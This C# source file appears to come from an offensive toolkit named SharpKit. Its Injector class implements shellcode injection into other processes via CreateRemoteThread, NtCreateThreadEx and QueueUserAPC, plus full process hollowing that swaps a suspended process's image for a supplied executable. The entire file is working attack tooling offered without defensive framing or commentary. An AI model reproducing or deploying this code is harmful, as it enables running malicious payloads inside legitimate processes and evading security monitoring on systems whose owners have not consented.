using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpKit;

public enum InjectionMethod
{
    CreateRemoteThread,
    QueueUserAPC,
    ProcessHollowing,
    NtCreateThreadEx
}

public sealed class InjectionResult
{
    public bool Success { get; init; }
    public uint ThreadId { get; init; }
    public IntPtr RemoteBaseAddress { get; init; }
    public int LastError { get; init; }
    public string ErrorMessage { get; init; } = string.Empty;
}

public static class Injector
{
    [DllImport("ntdll.dll")]
    private static extern int NtCreateThreadEx(
        out IntPtr threadHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        int stackZeroBits,
        int sizeOfStack,
        int maximumStackSize,
        IntPtr attributeList);

    [DllImport("ntdll.dll")]
    private static extern int NtWriteVirtualMemory(
        IntPtr processHandle,
        IntPtr baseAddress,
        byte[] buffer,
        uint numberOfBytesToWrite,
        out uint numberOfBytesWritten);

    [DllImport("ntdll.dll")]
    private static extern int NtAllocateVirtualMemory(
        IntPtr processHandle,
        ref IntPtr baseAddress,
        IntPtr zeroBits,
        ref IntPtr regionSize,
        uint allocationType,
        uint protect);

    [DllImport("ntdll.dll")]
    private static extern int NtProtectVirtualMemory(
        IntPtr processHandle,
        ref IntPtr baseAddress,
        ref IntPtr numberOfBytesToProtect,
        uint newAccessProtection,
        out uint oldAccessProtection);

    [DllImport("ntdll.dll")]
    private static extern int NtUnmapViewOfSection(IntPtr processHandle, IntPtr baseAddress);

    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(
        IntPtr processHandle,
        int processInformationClass,
        IntPtr processInformation,
        uint processInformationLength,
        out uint returnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [StructLayout(LayoutKind.Sequential)]
    private struct CONTEXT64
    {
        public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags, MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] FltSave;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
        public ulong[] VectorRegister;
        public ulong VectorControl;
        public ulong DebugControl;
        public ulong LastBranchToRip;
        public ulong LastBranchFromRip;
        public ulong LastExceptionToRip;
        public ulong LastExceptionFromRip;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2_0;
        public IntPtr Reserved2_1;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    public static InjectionResult InjectCreateRemoteThread(int pid, byte[] shellcode)
    {
        var hProcess = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == IntPtr.Zero)
            return new InjectionResult { Success = false, LastError = Marshal.GetLastWin32Error(), ErrorMessage = "OpenProcess failed" };

        try
        {
            var remoteAddr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, Win32.MEM_COMMIT | Win32.MEM_RESERVE, Win32.PAGE_READWRITE);
            if (remoteAddr == IntPtr.Zero)
                return new InjectionResult { Success = false, LastError = Marshal.GetLastWin32Error(), ErrorMessage = "VirtualAllocEx failed" };

            if (!Win32.WriteMemory(hProcess, remoteAddr, shellcode))
            {
                Win32.VirtualFreeEx(hProcess, remoteAddr, 0, Win32.MEM_RELEASE);
                return new InjectionResult { Success = false, LastError = Marshal.GetLastWin32Error(), ErrorMessage = "WriteProcessMemory failed" };
            }

            Win32.VirtualProtectEx(hProcess, remoteAddr, (uint)shellcode.Length, Win32.PAGE_EXECUTE_READ, out _);

            var hThread = Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out var threadId);
            if (hThread == IntPtr.Zero)
            {
                Win32.VirtualFreeEx(hProcess, remoteAddr, 0, Win32.MEM_RELEASE);
                return new InjectionResult { Success = false, LastError = Marshal.GetLastWin32Error(), ErrorMessage = "CreateRemoteThread failed" };
            }

            Win32.CloseHandle(hThread);
            return new InjectionResult { Success = true, ThreadId = threadId, RemoteBaseAddress = remoteAddr };
        }
        finally
        {
            Win32.CloseHandle(hProcess);
        }
    }

    public static InjectionResult InjectNtCreateThreadEx(int pid, byte[] shellcode)
    {
        var hProcess = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == IntPtr.Zero)
            return new InjectionResult { Success = false, LastError = Marshal.GetLastWin32Error(), ErrorMessage = "OpenProcess failed" };

        try
        {
            var remoteAddr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, Win32.MEM_COMMIT | Win32.MEM_RESERVE, Win32.PAGE_READWRITE);
            if (remoteAddr == IntPtr.Zero)
                return new InjectionResult { Success = false, LastError = Marshal.GetLastWin32Error(), ErrorMessage = "VirtualAllocEx failed" };

            if (!Win32.WriteMemory(hProcess, remoteAddr, shellcode))
            {
                Win32.VirtualFreeEx(hProcess, remoteAddr, 0, Win32.MEM_RELEASE);
                return new InjectionResult { Success = false, LastError = Marshal.GetLastWin32Error(), ErrorMessage = "WriteProcessMemory failed" };
            }

            Win32.VirtualProtectEx(hProcess, remoteAddr, (uint)shellcode.Length, Win32.PAGE_EXECUTE_READ, out _);

            var status = NtCreateThreadEx(out var hThread, 0x1FFFFF, IntPtr.Zero, hProcess, remoteAddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (status < 0 || hThread == IntPtr.Zero)
            {
                Win32.VirtualFreeEx(hProcess, remoteAddr, 0, Win32.MEM_RELEASE);
                return new InjectionResult { Success = false, LastError = status, ErrorMessage = $"NtCreateThreadEx failed: 0x{status:X8}" };
            }

            Win32.CloseHandle(hThread);
            return new InjectionResult { Success = true, RemoteBaseAddress = remoteAddr };
        }
        finally
        {
            Win32.CloseHandle(hProcess);
        }
    }

    public static InjectionResult InjectQueueUserAPC(int pid, byte[] shellcode)
    {
        var hProcess = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == IntPtr.Zero)
            return new InjectionResult { Success = false, LastError = Marshal.GetLastWin32Error(), ErrorMessage = "OpenProcess failed" };

        try
        {
            var remoteAddr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, Win32.MEM_COMMIT | Win32.MEM_RESERVE, Win32.PAGE_READWRITE);
            if (remoteAddr == IntPtr.Zero)
                return new InjectionResult { Success = false, LastError = Marshal.GetLastWin32Error(), ErrorMessage = "VirtualAllocEx failed" };

            if (!Win32.WriteMemory(hProcess, remoteAddr, shellcode))
            {
                Win32.VirtualFreeEx(hProcess, remoteAddr, 0, Win32.MEM_RELEASE);
                return new InjectionResult { Success = false, LastError = Marshal.GetLastWin32Error(), ErrorMessage = "WriteProcessMemory failed" };
            }

            Win32.VirtualProtectEx(hProcess, remoteAddr, (uint)shellcode.Length, Win32.PAGE_EXECUTE_READ, out _);

            var process = Process.GetProcessById(pid);
            bool queued = false;

            foreach (ProcessThread thread in process.Threads)
            {
                var hThread = Win32.OpenThread(0x0020, false, (uint)thread.Id);
                if (hThread == IntPtr.Zero) continue;

                try
                {
                    var result = Win32.QueueUserAPC(remoteAddr, hThread, IntPtr.Zero);
                    if (result != IntPtr.Zero)
                        queued = true;
                }
                finally
                {
                    Win32.CloseHandle(hThread);
                }
            }

            if (!queued)
            {
                Win32.VirtualFreeEx(hProcess, remoteAddr, 0, Win32.MEM_RELEASE);
                return new InjectionResult { Success = false, ErrorMessage = "QueueUserAPC failed for all threads" };
            }

            return new InjectionResult { Success = true, RemoteBaseAddress = remoteAddr };
        }
        finally
        {
            Win32.CloseHandle(hProcess);
        }
    }

    public static InjectionResult HollowProcess(string targetPath, byte[] peBytes)
    {
        var si = new Win32.STARTUPINFO { cb = (uint)Marshal.SizeOf<Win32.STARTUPINFO>() };
        var sa = new Win32.SECURITY_ATTRIBUTES { nLength = Marshal.SizeOf<Win32.SECURITY_ATTRIBUTES>() };

        if (!Win32.CreateProcess(targetPath, targetPath, ref sa, ref sa, false, Win32.CREATE_SUSPENDED | Win32.CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out var pi))
            return new InjectionResult { Success = false, LastError = Marshal.GetLastWin32Error(), ErrorMessage = "CreateProcess failed" };

        try
        {
            var pbiSize = (uint)Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
            var pbiBuffer = Marshal.AllocHGlobal((int)pbiSize);

            try
            {
                NtQueryInformationProcess(pi.hProcess, 0, pbiBuffer, pbiSize, out _);
                var pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(pbiBuffer);

                var pebImageBaseOffset = pbi.PebBaseAddress + 0x10;
                var imageBaseBytes = Win32.ReadMemory(pi.hProcess, pebImageBaseOffset, 8);
                var originalBase = (IntPtr)BitConverter.ToInt64(imageBaseBytes, 0);

                NtUnmapViewOfSection(pi.hProcess, originalBase);

                var peHeader = peBytes.Take(0x40).ToArray();
                var e_lfanew = BitConverter.ToInt32(peHeader, 0x3C);
                var optHeaderOffset = e_lfanew + 4 + 20;
                var imageBase = BitConverter.ToInt64(peBytes, optHeaderOffset + 24);
                var sizeOfImage = BitConverter.ToInt32(peBytes, optHeaderOffset + 56);
                var sizeOfHeaders = BitConverter.ToInt32(peBytes, optHeaderOffset + 60);

                var newBase = (IntPtr)imageBase;
                var regionSize = (IntPtr)sizeOfImage;

                NtAllocateVirtualMemory(pi.hProcess, ref newBase, IntPtr.Zero, ref regionSize, Win32.MEM_COMMIT | Win32.MEM_RESERVE, Win32.PAGE_EXECUTE_READWRITE);

                Win32.WriteMemory(pi.hProcess, newBase, peBytes.Take(sizeOfHeaders).ToArray());

                var numSections = BitConverter.ToInt16(peBytes, e_lfanew + 4 + 2);
                var sectionHeaderOffset = optHeaderOffset + BitConverter.ToInt16(peBytes, e_lfanew + 4 + 16);

                for (int i = 0; i < numSections; i++)
                {
                    var sectionOffset = sectionHeaderOffset + i * 40;
                    var virtualAddress = BitConverter.ToInt32(peBytes, sectionOffset + 12);
                    var rawSize = BitConverter.ToInt32(peBytes, sectionOffset + 16);
                    var rawOffset = BitConverter.ToInt32(peBytes, sectionOffset + 20);

                    if (rawSize == 0) continue;

                    var sectionData = peBytes.Skip(rawOffset).Take(rawSize).ToArray();
                    Win32.WriteMemory(pi.hProcess, newBase + virtualAddress, sectionData);
                }

                var imageBaseBuffer = BitConverter.GetBytes(newBase.ToInt64());
                Win32.WriteMemory(pi.hProcess, pebImageBaseOffset, imageBaseBuffer);

                var ctx = new CONTEXT64 { ContextFlags = 0x10001B };
                ctx.FltSave = new byte[512];
                ctx.VectorRegister = new ulong[26];

                GetThreadContext(pi.hThread, ref ctx);
                var entryPointRva = BitConverter.ToInt32(peBytes, optHeaderOffset + 16);
                ctx.Rcx = (ulong)(newBase.ToInt64() + entryPointRva);
                SetThreadContext(pi.hThread, ref ctx);

                Win32.ResumeThread(pi.hThread);

                return new InjectionResult { Success = true, RemoteBaseAddress = newBase, ThreadId = pi.dwThreadId };
            }
            finally
            {
                Marshal.FreeHGlobal(pbiBuffer);
            }
        }
        catch (Exception ex)
        {
            Win32.TerminateProcess(pi.hProcess, 1);
            return new InjectionResult { Success = false, ErrorMessage = ex.Message };
        }
        finally
        {
            Win32.CloseHandle(pi.hThread);
            Win32.CloseHandle(pi.hProcess);
        }
    }

    public static InjectionResult Inject(int pid, byte[] shellcode, InjectionMethod method)
    {
        return method switch
        {
            InjectionMethod.CreateRemoteThread => InjectCreateRemoteThread(pid, shellcode),
            InjectionMethod.QueueUserAPC => InjectQueueUserAPC(pid, shellcode),
            InjectionMethod.NtCreateThreadEx => InjectNtCreateThreadEx(pid, shellcode),
            _ => new InjectionResult { Success = false, ErrorMessage = $"Unsupported method: {method}" }
        };
    }
}
